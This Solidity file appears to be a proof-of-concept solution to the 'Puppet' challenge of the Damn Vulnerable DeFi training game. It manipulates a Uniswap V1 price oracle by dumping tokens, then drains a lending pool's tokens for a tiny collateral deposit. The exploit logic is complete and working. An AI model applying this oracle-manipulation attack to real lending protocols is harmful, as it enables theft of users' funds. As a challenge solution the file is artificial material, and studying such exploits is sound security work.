// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
}

contract Puppet_POC {
    PuppetPool public pool;
    DamnValuableToken public token;

    address public uni;
    address public player;

    constructor(PuppetPool _pool, DamnValuableToken _token, address _uni) {
        player = msg.sender;
        pool = _pool;
        token = _token;
        uni = _uni;
    }

    function exploit() external payable {
        token.approve(uni, token.balanceOf(address(this)));
        IUniswapExchangeV1(uni).tokenToEthTransferInput(token.balanceOf(address(this)), 9, block.timestamp, address(this));

        uint256 need = pool.calculateDepositRequired(token.balanceOf(address(pool)));

        pool.borrow{value : need}(token.balanceOf(address(pool)), address(this));

        token.transfer(player, token.balanceOf(address(this)));
        payable(player).transfer(address(this).balance);
    }

    receive() external payable { }
    fallback() external payable { }
}